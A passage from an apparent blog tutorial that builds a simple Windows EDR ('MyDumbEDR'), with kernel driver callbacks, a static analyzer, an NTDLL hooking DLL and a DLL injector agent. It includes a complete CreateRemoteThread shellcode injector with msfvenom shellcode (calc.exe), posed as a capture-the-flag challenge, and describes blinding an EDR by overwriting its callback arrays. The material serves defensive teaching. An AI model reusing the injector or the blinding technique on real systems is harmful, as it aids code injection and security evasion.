(!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&symlinkName, &deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Registers the kernel callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Driver created\\n\");\n    return STATUS_SUCCESS;\n}\n\nThe logic is pretty dumb, but for demonstration purposes if the image filename of the process being created is mimikatz, then the EDR blocks the creation of the process:\n\nAs you can see, notepad.exe is allowed while mimikatz.exe is denied, perfect!\n\nNow to go a little deeper in the kernel callback mechanism, we may ask ourself how the kernel is able to know if a driver registered a kernel callback? Well for each function callback we mentioned before, there is an array in kernel memory that stores pointers to callbacks (like those from EDR routines):\n\nFunction callback\tCorresponding array nam\tMax number of callbacks\nPsSetCreateProcessNotifyRoutine\tPspCreateProcessNotifyRoutine\t64\nPsSetCreateThreadNotifyRoutine\tPspCreateThreadNotifyRoutine\t64\nPsSetLoadImageNotifyRoutine\tPspLoadImageNotifyRoutine\t8\nCmRegisterCallback\tCmpCallBackVector\t100\n\nUsing WinDBG.exe we can check the actual content of these arrays. For example on the following screenshot we can see that the PspCreateProcessNotifyRoutine contains 9 hexadecimal addresses, hence 9 kernel callbacks:\n\nTherefore, each time a process is launched, the kernel will read the PspCreateProcessNotifyRoutine array and for each of the 9 pointers, it will send a notification about the process being created. As an attacker these arrays are specifically interesting because if you can overwrite them or remove the pointers, you will basically be able to “blind” the EDR and thus prevent it from monitoring the system (and there is already a pretty cool tool that will allow you doing that, CheekyBlinder).\n\nAt this point our driver is able to monitor for process creation and deny it if the image filename is mimikatz. Obviously this logic is not enough because if you rename mimikatz.exe to notmimikatz.exe, you will bypass the check. Thus we will have to develop a more complex detection routine.\n\nVII/ From theorical kernel callbacks to a fully working EDR\n\nJust being aware of a process being created on the system is interesting but if we don’t act on the information, it’s useless. As a security product developer we need to implement some sort of logic that will allow us to determine if this process is legitimate or not. For security and stability reasons (mostly because developing in kernel space is a nightmare) every EDR relies on a user space agent that orchestrates the entire EDR solution. This agent is typically doing at least two things:\n\nIt analyzes binaries being launched on the system statically\nIt injects a custom DLL into the process in order to monitor API calls\n\nSo basically a more realistic, yet simplistic, schema of how a EDR works would be the following:\n\nThe kernel driver receives notifications about specific actions being executed on the system via the kernel callbacks mechanism, then it forwards this to the agent where most of the detection logic is developed.\n\nSo we are going to have to develop a custom user space agent that is going to be the one analysing the system. But before going further let’s settle on what are our expectations for our EDR. At this point the only thing I wanted MyDumbEDR to be able to detect is binaries that attempt to inject shellcode into remote process using the following simple CreateRemoteThread technique:\n\n\n#include \"stdio.h\"\n#include <Windows.h>\n#include <TlHelp32.h>\n\nint get_process_id_from_szexefile(wchar_t processName[]) {\n\tPROCESSENTRY32 entry = { 0 };\n\tentry.dwSize = sizeof(PROCESSENTRY32);\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\tif (Process32First(snapshot, &entry) == TRUE) {\n\t\twhile (Process32Next(snapshot, &entry) == TRUE) {\n\t\t\tif (wcscmp(entry.szExeFile, processName) == 0) {\n\t\t\t\treturn entry.th32ProcessID;\n\t\t\t}\n\t\t}\n\t}\n\telse {\n\t\tprintf(\"CreateToolhelper32Snapshot failed : %d\\n\", GetLastError());\n\t\texit(1);\n\t}\n\tprintf(\"Process not found.\\n\");\n\texit(1);\n}\n\nvoid check_if_se_debug_privilege_is_enabled() {\n\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());\n\tHANDLE hToken;\n\tOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);\n\tDWORD cbSize;\n\tGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);\n\tPTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);\n\tGetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);\n\tDWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));\n\n\tTOKEN_PRIVILEGES tp;\n\n\tLUID luidSeDebugPrivilege;\n\tif (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0) {\n\t\tprintf(\"SeDebugPrivilege not owned\\n\");\n\t}\n\telse {\n\t\tprintf(\"SeDebugPrivilege owned\\n\");\n\t}\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = luidSeDebugPrivilege;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {\n\t\tprintf(\"SeDebugPrivilege adjust token failed: %d\\n\", GetLastError());\n\t}\n\telse {\n\t\tprintf(\"SeDebugPrivilege enabled.\\n\");\n\t}\n\n\tCloseHandle(hProcess);\n\tCloseHandle(hToken);\n}\n\nint main() {\n\tprintf(\"Launching remote shellcode injection\\n\");\n\t\n\t// DO NOT REMOVE\n\t// When loading a DLL remotely, its content won't apply until all DLL's are loaded\n\t// For some reason it leads to a race condition which is not part of the challenge\n\t// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)\n\tSleep(5000);\n\t// DO NOT REMOVE\n\tcheck_if_se_debug_privilege_is_enabled();\n\twchar_t processName[] = L\"notepad.exe\";\n\tint processId = get_process_id_from_szexefile(processName);\n\tprintf(\"Injecting to PID: %i\\n\", processId);\n\tHANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));\n\t\n\t\n\t// msfvenom -p windows/x64/exec CMD=calc.exe -b \"\\x00\\x0a\\0d\" -f c\n\tunsigned char shellcode[] =\n\t\t\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdb\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\"\n\t\t\"\\xff\\xff\\x48\\xbb\\x33\\xef\\x18\\x46\\xf8\\x06\\x62\\xef\\x48\\x31\\x58\"\n\t\t\"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xcf\\xa7\\x9b\\xa2\\x08\\xee\"\n\t\t\"\\xa2\\xef\\x33\\xef\\x59\\x17\\xb9\\x56\\x30\\xbe\\x65\\xa7\\x29\\x94\\x9d\"\n\t\t\"\\x4e\\xe9\\xbd\\x53\\xa7\\x93\\x14\\xe0\\x4e\\xe9\\xbd\\x13\\xa7\\x93\\x34\"\n\t\t\"\\xa8\\x4e\\x6d\\x58\\x79\\xa5\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xd3\\x79\"\n\t\t\"\\x3a\\xfa\\x2a\\x42\\xae\\xf2\\x26\\x15\\x07\\xf9\\xc7\\x80\\x02\\x61\\xae\"\n\t\t\"\\x49\\x0e\\x73\\x54\\x42\\x64\\x71\\xd3\\x50\\x47\\x28\\x8d\\xe2\\x67\\x33\"\n\t\t\"\\xef\\x18\\x0e\\x7d\\xc6\\x16\\x88\\x7b\\xee\\xc8\\x16\\x73\\x4e\\x7a\\xab\"\n\t\t\"\\xb8\\xaf\\x38\\x0f\\xf9\\xd6\\x81\\xb9\\x7b\\x10\\xd1\\x07\\x73\\x32\\xea\"\n\t\t\"\\xa7\\x32\\x39\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xae\\xd9\\x8f\\xf5\\x47\"\n\t\t\"\\x63\\x2e\\x0b\\x0f\\x6d\\xb7\\xb4\\x05\\x2e\\xcb\\x3b\\xaa\\x21\\x97\\x8d\"\n\t\t\"\\xde\\x3a\\xab\\xb8\\xaf\\x3c\\x0f\\xf9\\xd6\\x04\\xae\\xb8\\xe3\\x50\\x02\"\n\t\t\"\\x73\\x46\\x7e\\xa6\\x32\\x3f\\x59\\xcd\\xfc\\x8e\\x2a\\xee\\xe3\\xae\\x40\"\n\t\t\"\\x07\\xa0\\x58\\x3b\\xb5\\x72\\xb7\\x59\\x1f\\xb9\\x5c\\x2a\\x6c\\xdf\\xcf\"\n\t\t\"\\x59\\x14\\x07\\xe6\\x3a\\xae\\x6a\\xb5\\x50\\xcd\\xea\\xef\\x35\\x10\\xcc\"\n\t\t\"\\x10\\x45\\x0e\\x42\\x07\\x62\\xef\\x33\\xef\\x18\\x46\\xf8\\x4e\\xef\\x62\"\n\t\t\"\\x32\\xee\\x18\\x46\\xb9\\xbc\\x53\\x64\\x5c\\x68\\xe7\\x93\\x43\\xf6\\xd7\"\n\t\t\"\\x4d\\x65\\xae\\xa2\\xe0\\x6d\\xbb\\xff\\x10\\xe6\\xa7\\x9b\\x82\\xd0\\x3a\"\n\t\t\"\\x64\\x93\\x39\\x6f\\xe3\\xa6\\x8d\\x03\\xd9\\xa8\\x20\\x9d\\x77\\x2c\\xf8\"\n\t\t\"\\x5f\\x23\\x66\\xe9\\x10\\xcd\\x05\\xc2\\x5a\\x35\\x86\\x5d\\x8b\\x77\\x31\"\n\t\t\"\\x8b\\x5a\\x31\\x96\\x40\\x9b\\x7d\\x2b\\xcb\\x34\\x3e\\x8c\\x52\\x83\\x7b\"\n\t\t\"\\x68\\x9d\\x7e\\x07\\xef\";\n    printf(\"VirtualAllocEx\\n\");\n\tPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\n\tprintf(\"WriteProcessMemory\\n\");\n\tWriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);\n\t\n\tprintf(\"CreateRemoteThread\\n\");\n\tHANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\n\t\n\tprintf(\"Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\\n\");\n\tprintf(\"Expect more checks in the upcoming weeks ;)\\n\");\n\tCloseHandle(processHandle);\n\treturn 0;\n}\n\nThere are quite a few markers that can be used to flag this binary as malicious. First, it uses multiple functions in an order that is suspicious: OpenProcess > VirtualAllocEx > WriteProcessMemory > CreateRemoteThread. Then, the binary is allocating RWX (read, write, execute) memory which is suspicious. Finally it contains suspicious strings as well as an obviously flagged msfvenom shellcode payload.\n\nFor our EDR, I decided to create two agents instead of one. Both these agents will receive information from the driver via a named pipe which is an Internal Process Communication mechanism.\n\nThus, the MyDumbEDR relies on 3 components:\n\nThe kernel driver which will receive notifications about processes being created\nThe StaticAnalyzer agent which will statically analyse the binary\nThe RemoteInjector agent which will inject a custom DLL in each process being created\n\nSchematically:\n\nLet’s take a closer look at what both the agents do.\n\n1/ The static analyzer\n\nThe static analyser receives the path of the image filename of the processes being launched. It will then statically check for three things:\n\nIf the binary is signed\nIf the OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread functions are listed in the IAT (Import Address Table)\nIf the string SeDebugPrivilege is present in the binary\n\nBelow is the code of the agent:\n\n\n#include <stdio.h>\n#include <windows.h>\n#include <dbghelp.h>\n#include <wintrust.h>\n#include <Softpub.h>\n#include <wincrypt.h>\n\n#pragma comment (lib, \"wintrust.lib\")\n#pragma comment(lib, \"dbghelp.lib\")\n#pragma comment(lib, \"crypt32.lib\")\n\n#define MESSAGE_SIZE 2048\n\nBOOL VerifyEmbeddedSignature(const wchar_t* binaryPath) {\n    LONG lStatus;\n    WINTRUST_FILE_INFO FileData;\n    memset(&FileData, 0, sizeof(FileData));\n    FileData.cbStruct = sizeof(WINTRUST_FILE_INFO);\n    FileData.pcwszFilePath = binaryPath;\n    FileData.hFile = NULL;\n    FileData.pgKnownSubject = NULL;\n    GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;\n    WINTRUST_DATA WinTrustData;\n\n    // Initializing necessary structures\n    memset(&WinTrustData, 0, sizeof(WinTrustData));\n    WinTrustData.cbStruct = sizeof(WinTrustData);\n    WinTrustData.pPolicyCallbackData = NULL;\n    WinTrustData.pSIPClientData = NULL;\n    WinTrustData.dwUIChoice = WTD_UI_NONE;\n    WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;\n    WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;\n    WinTrustData.dwStateAction = WTD_STATEACTION_VERIFY;\n    WinTrustData.hWVTStateData = NULL;\n    WinTrustData.pwszURLReference = NULL;\n    WinTrustData.dwUIContext = 0;\n    WinTrustData.pFile = &FileData;\n\n    // WinVerifyTrust verifies signatures as specified by the GUID and Wintrust_Data.\n    lStatus = WinVerifyTrust(NULL, &WVTPolicyGUID, &WinTrustData);\n\n    BOOL isSigned;\n    switch (lStatus) {\n        // The file is signed and the signature was verified\n    case ERROR_SUCCESS:\n        isSigned = TRUE;\n        break;\n\n        // File is signed but the signature is not verified or is not trusted\n    case TRUST_E_SUBJECT_FORM_UNKNOWN || TRUST_E_PROVIDER_UNKNOWN || TRUST_E_EXPLICIT_DISTRUST || CRYPT_E_SECURITY_SETTINGS || TRUST_E_SUBJECT_NOT_TRUSTED:\n        isSigned = TRUE;\n        break;\n\n        // The file is not signed\n    case TRUST_E_NOSIGNATURE:\n        isSigned = FALSE;\n        break;\n\n        // Shouldn't happen but hey may be!\n    default:\n        isSigned = FALSE;\n        break;\n    }\n\n    // Any hWVTStateData must be released by a call with close.\n    WinTrustData.dwStateAction = WTD_STATEACTION_CLOSE;\n    WinVerifyTrust(NULL, &WVTPolicyGUID, &WinTrustData);\n\n    return isSigned;\n}\n\nBOOL ListImportedFunctions(const wchar_t* binaryPath) {\n    BOOL isOpenProcessPresent = FALSE;\n    BOOL isVirtualAllocExPresent = FALSE;\n    BOOL isWriteProcessMemoryPresent = FALSE;\n    BOOL isCreateRemoteThreadPresent = FALSE;\n    // Load the target binary so that we can parse its content\n    HMODULE hModule = LoadLibraryEx(binaryPath, NULL, DONT_RESOLVE_DLL_REFERENCES);\n    if (hModule != NULL) {\n        // Get NT headers from the binary\n        IMAGE_NT_HEADERS* ntHeaders = ImageNtHeader(hModule);\n        if (ntHeaders != NULL) {\n            // Locate the IAT\n            IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\n            // Loop over the DLL's\n            while (importDesc->Name != 0) {\n                const char* moduleName = (const char*)((BYTE*)hModule + importDesc->Name);\n\n                // Loop over the functions of the DLL\n                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)((BYTE*)hModule + importDesc->OriginalFirstThunk);\n                while (thunk->u1.AddressOfData != 0) {\n                    if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {\n                        // printf(\"\\tOrdinal: %llu\\n\", IMAGE_ORDINAL(thunk->u1.Ordinal));\n                    }\n                    else {\n                        IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)hModule + thunk->u1.AddressOfData);\n                        // printf(\"\\tFunction: %s\\n\", importByName->Name);\n                        // Checks if the following functions are used by the binary\n\n                        if (strcmp(\"OpenProcess\", importByName->Name) == 0) {\n                            isOpenProcessPresent = TRUE;\n                        }\n\n                        if (strcmp(\"VirtualAllocEx\", importByName->Name) == 0) {\n                            isVirtualAllocExPresent = TRUE;\n                        }\n\n                        if (strcmp(\"WriteProcessMemory\", importByName->Name) == 0) {\n                            isWriteProcessMemoryPresent = TRUE;\n                        }\n\n                        if (strcmp(\"CreateRemoteThread\", importByName->Name) == 0) {\n                            isCreateRemoteThreadPresent = TRUE;\n                        }\n\n                    }\n                    thunk++;\n                }\n                importDesc++;\n            }\n            FreeLibrary(hModule);\n        }\n        FreeLibrary(hModule);\n    }\n\n    if (isOpenProcessPresent && isVirtualAllocExPresent && isWriteProcessMemoryPresent && isCreateRemoteThreadPresent) {\n        return TRUE;\n    }\n    else {\n        return FALSE;\n    }\n    return FALSE;\n}\n\nBOOL lookForSeDebugPrivilegeString(const wchar_t* filename) {\n    FILE* file;\n    _wfopen_s(&file, filename, L\"rb\");\n    if (file != NULL) {\n        fseek(file, 0, SEEK_END);\n        long file_size = ftell(file);\n        rewind(file);\n        char* buffer = (char*)malloc(file_size);\n        if (buffer != NULL) {\n            if (fread(buffer, 1, file_size, file) == file_size) {\n                const char* search_string = \"SeDebugPrivilege\";\n                size_t search_length = strlen(search_string);\n                int i, j;\n                int found = 0;\n                for (i = 0; i <= file_size - search_length; i++) {\n                    for (j = 0; j < search_length; j++) {\n                        if (buffer[i + j] != search_string[j]) {\n                            break;\n                        }\n                    }\n                    if (j == search_length) {\n                        return TRUE;\n                    }\n                }\n            }\n            free(buffer);\n        }\n        fclose(file);\n    }\n    return FALSE;\n}\n\nint main() {\n    LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\dumbedr-analyzer\";\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    printf(\"Launching analyzer named pipe server\\n\");\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n        if (isPipeConnected) {\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,         // Handle to the named pipe\n                &target_binary_file, // Target buffer where to stock the output\n                MESSAGE_SIZE,        // Size of the buffer\n                &bytesRead,          // Number of bytes read from ReadFile\n                NULL                 // Whether or not the pipe supports overlapped operations\n            );\n\n            printf(\"~> Received binary file %ws\\n\", target_binary_file);\n            int res = 0;\n\n            BOOL isSeDebugPrivilegeStringPresent = lookForSeDebugPrivilegeString(target_binary_file);\n            if (isSeDebugPrivilegeStringPresent == TRUE) {\n                printf(\"\\t\\033[31mFound SeDebugPrivilege string.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[32mSeDebugPrivilege string not found.\\033[0m\\n\");\n            }\n\n            BOOL isDangerousFunctionsFound = ListImportedFunctions(target_binary_file);\n            if (isDangerousFunctionsFound == TRUE) {\n                printf(\"\\t\\033[31mDangerous functions found.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[32mNo dangerous functions found.\\033[0m\\n\");\n            }\n\n            BOOL isSigned = VerifyEmbeddedSignature(target_binary_file);\n            if (isSigned == TRUE) {\n                printf(\"\\t\\033[32mBinary is signed.\\033[0m\\n\");\n            }\n            else {\n                printf(\"\\t\\033[31mBinary is not signed.\\033[0m\\n\");\n            }\n\n            wchar_t response[MESSAGE_SIZE] = { 0 };\n            if (isSigned == TRUE) {\n                swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n                printf(\"\\t\\033[32mStaticAnalyzer allows\\033[0m\\n\");\n            }\n            else {\n                // If the following conditions are met, the binary is blocked\n                if (isDangerousFunctionsFound || isSeDebugPrivilegeStringPresent) {\n                    swprintf_s(response, MESSAGE_SIZE, L\"KO\\0\");\n                    printf(\"\\n\\t\\033[31mStaticAnalyzer denies\\033[0m\\n\");\n                }\n                else {\n                    swprintf_s(response, MESSAGE_SIZE, L\"OK\\0\");\n                    printf(\"\\n\\t\\033[32mStaticAnalyzer allows\\033[0m\\n\");\n                }\n            }\n\n            DWORD bytesWritten = 0;\n            // Write to the named pipe\n            WriteFile(\n                hServerPipe,   // Handle to the named pipe\n                response,      // Buffer to write from\n                MESSAGE_SIZE,  // Size of the buffer \n                &bytesWritten, // Numbers of bytes written\n                NULL           // Whether or not the pipe supports overlapped operations\n            );\n\n        }\n\n        // Disconnect\n        DisconnectNamedPipe(\n            hServerPipe // Handle to the named pipe\n        );\n\n        printf(\"\\n\\n\");\n    }\n    return 0;\n}\n\nPretty simple. The remote injector agent will be a little bit more complicated!\n\n2/ The remote injector\n\nOne thing EDR’s like to do is to apply a mechanism called function hooking.\n\nAs we have seen before, and because of PatchGuard, it is not possible to modify the SSDT or any other critical kernel structures anymore. So what anti-virus editors thought of is to instead modify the NTDLL.dll directly. Since it is the last building block before entering kernel space, and since it is the user mode reflection of the kernel itself, if a defender is able to analyse the parameters sent to the functions exposed by the NTDLL.dll, they will be able to dynamically analyse if these function calls are legitimate or malicious. To do so, EDR’s simply temporarily redirect code flow from NTDLL.dll functions to their own code:\n\nThe question is, how do you redirect code flow from NTDLL.dll? When a process is created, it loads a copy of a few necessary DLL’s. Obviously, a copy of NTDLL.dll is made and, if we are skilled enough, we can modify its content. To modify the flow of a function from NTDLL.dll, we simply need to parse the DLL, find the functions we want to hook and modify its code so that it jumps to the code of our EDR instead.\n\nEasy in theory. A lot harder in practice. Thankfully there is an insane library called MinHook, developed by TsudaKageyu, that will allow us to achieve our hooking goal quite easily. Using the MinHook library we are going to build a DLL that the remote injector agent will inject into each and every process that is created. This DLL will only hook one function from the NTDLL.dll: NtAllocateVirtualMemory. Why this function? Because the NtAllocateVirtualMemory is the function from NTDLL.dll that is used to allocate and protect a memory space. Since our EDR will focus on detecting tools that injects shellcode remotely, this function is the most important one to monitor.\n\nBelow you will find the commented code of the DLL that we will inject (thankfully it includes usage of minhook):\n\n\n#include \"pch.h\"\n#include \"minhook/include/MinHook.h\"\n\n\n// Defines the prototype of the NtAllocateVirtualMemoryFunction\ntypedef DWORD(NTAPI* pNtAllocateVirtualMemory)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T RegionSize,\n    ULONG AllocationType,\n    ULONG Protect\n    );\n\n// Pointer to the trampoline function used to call the original NtAllocateVirtualMemory\npNtAllocateVirtualMemory pOriginalNtAllocateVirtualMemory = NULL;\n\n// This is the function that will be called whenever the injected process calls \n// NtAllocateVirtualMemory. This function takes the arguments Protect and checks\n// if the requested protection is RWX (which shouldn't happen).\nDWORD NTAPI NtAllocateVirtualMemory(\n    HANDLE ProcessHandle, \n    PVOID* BaseAddress, \n    ULONG_PTR ZeroBits, \n    PSIZE_T RegionSize, \n    ULONG AllocationType, \n    ULONG Protect\n) {\n\n    // Checks if the program is trying to allocate some memory and protect it with RWX \n    if (Protect == PAGE_EXECUTE_READWRITE) {\n        // If yes, we notify the user and terminate the process\n        MessageBox(NULL, L\"Dude, are you trying to RWX me ?\", L\"Found u bro\", MB_OK);\n        TerminateProcess(GetCurrentProcess(), 0xdeadb33f);\n    }\n\n    //If no, we jump on the originate NtAllocateVirtualMemory\n    return pOriginalNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);\n}\n\n// This function initializes the hooks via the MinHook library\nDWORD WINAPI InitHooksThread(LPVOID param) {\n    if (MH_Initialize() != MH_OK) {\n        return -1;\n    }\n\n    // Here we specify which function from wich DLL we want to hook\n    MH_CreateHookApi(   \n        L\"ntdll\",                                     // Name of the DLL containing the function to  hook\n        \"NtAllocateVirtualMemory\",                    // Name of the function to hook\n        NtAllocateVirtualMemory,                      // Address of the function on which to jump when hooking \n        (LPVOID *)(&pOriginalNtAllocateVirtualMemory) // Address of the original NtAllocateVirtualMemory function\n    );\n\n    // Enable the hook on NtAllocateVirtualMemory\n    MH_STATUS status = MH_EnableHook(MH_ALL_HOOKS);\n    return status;\n}\n\n// Here is the DllMain of our DLL\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){\n    switch (ul_reason_for_call){\n    case DLL_PROCESS_ATTACH: {\n        // This DLL will not be loaded by any thread so we simply disable DLL_TRHEAD_ATTACH and DLL_THREAD_DETACH\n        DisableThreadLibraryCalls(hModule);\n\n        // Calling WinAPI32 functions from the DllMain is a very bad practice \n        // since it can basically lock the program loading the DLL\n        // Microsoft recommends not using any functions here except a few one like \n        // CreateThread IF AND ONLY IF there is no need for synchronization\n        // So basically we are creating a thread that will execute the InitHooksThread function \n        // thus allowing us hooking the NtAllocateVirtualMemory function\n        HANDLE hThread = CreateThread(NULL, 0, InitHooksThread, NULL, 0, NULL);\n        if (hThread != NULL) {\n            CloseHandle(hThread);\n        }\n        break;\n    }\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\nWith the DLL created, we need to inject it into every process we want to monitor. That’s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:\n\n\n#include <stdio.h>\n#include <windows.h>\n\n#define MESSAGE_SIZE 2048\n#define MAX_PATH 260\n\nint main() {\n    LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\dumbedr-injector\";\n    DWORD bytesRead = 0;\n    wchar_t target_binary_file[MESSAGE_SIZE] = { 0 };\n\n    char dll_path[] = \"x64\\\\Debug\\\\MyDumbEDRDLL.dll\";\n    char dll_full_path[MAX_PATH];\n    GetFullPathNameA(dll_path, MAX_PATH, dll_full_path, NULL);\n    printf(\"Launching injector named pipe server, injecting %s\\n\", dll_full_path);\n\n\n    // Creates a named pipe\n    HANDLE hServerPipe = CreateNamedPipe(\n        pipeName,                 // Pipe name to create\n        PIPE_ACCESS_DUPLEX,       // Whether the pipe is supposed to receive or send data (can be both)\n        PIPE_TYPE_MESSAGE,        // Pipe mode (whether or not the pipe is waiting for data)\n        PIPE_UNLIMITED_INSTANCES, // Maximum number of instances from 1 to PIPE_UNLIMITED_INSTANCES\n        MESSAGE_SIZE,             // Number of bytes for output buffer\n        MESSAGE_SIZE,             // Number of bytes for input buffer\n        0,                        // Pipe timeout \n        NULL                      // Security attributes (anonymous connection or may be needs credentials. )\n    );\n\n    while (TRUE) {\n\n        // ConnectNamedPipe enables a named pipe server to start listening for incoming connections\n        BOOL isPipeConnected = ConnectNamedPipe(\n            hServerPipe, // Handle to the named pipe\n            NULL         // Whether or not the pipe supports overlapped operations\n        );\n\n        wchar_t message[MESSAGE_SIZE] = { 0 };\n        \n        if (isPipeConnected) {\n\n            // Read from the named pipe\n            ReadFile(\n                hServerPipe,  // Handle to the named pipe\n                &message,     // Target buffer where to stock the output\n                MESSAGE_SIZE, // Size of the buffer\n                &bytesRead,   // Number of bytes read from ReadFile\n                NULL          // Whether or not the pipe supports overlapped operations\n            );\n\n            // Casting the message into a DWORD\n            DWORD target_pid = _wtoi(message);\n            printf(\"~> Received process id %d\\n\", target_pid);\n\n            // Opening the process with necessary privileges \n            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);\n            if (hProcess == NULL) {\n                printf(\"Can't open handle, error: % lu\\n\", GetLastError());\n                return FALSE;\n            }\n            printf(\"\\tOpen handle on PID: %d\\n\", target_pid);\n\n            // Looking for the LoadLibraryA function in the kernel32.dll\n            FARPROC loadLibAddress = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryA\");\n            if (loadLibAddress == NULL) {\n                printf(\"Could not find LoadLibraryA, error: %lu\\n\", GetLastError());\n                return FALSE;\n            }\n            printf(\"\\tFound LoadLibraryA function\\n\");\n\n            // Allocating some memory wth read/write privileges\n            LPVOID vae_buffer;\n            vae_buffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (vae_buffer == NULL){\n                printf(\"Can't allocate memory, error: %lu\\n\", GetLastError());\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(\"\\tAllocated: %d bytes\\n\", MAX_PATH);\n\n            // Writing the path of the DLL to inject: x64\\Debug\\MyDumbEDRDLL.dll\n            SIZE_T bytesWritten;\n            if (!WriteProcessMemory(hProcess, vae_buffer, dll_full_path, MAX_PATH, &bytesWritten)) {\n                printf(\"Can't write into memory, error: %lu\\n\", GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            printf(\"\\tWrote %zu in %d process memory\\n\", bytesWritten, target_pid);\n\n            // Creating a thread that will call LoadLibraryA and the path of the MyDUMBEDRDLL to load as argument\n            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddress, vae_buffer, 0, NULL);\n            if (hThread == NULL) {\n                printf(\"Can't launch remote thread, error: %lu\\n\", GetLastError());\n                VirtualFreeEx(hProcess, vae_buffer, MESSAGE_SIZE, MEM_RELEASE);\n                CloseHandle(hProcess);\n                return FALSE;\n            }\n            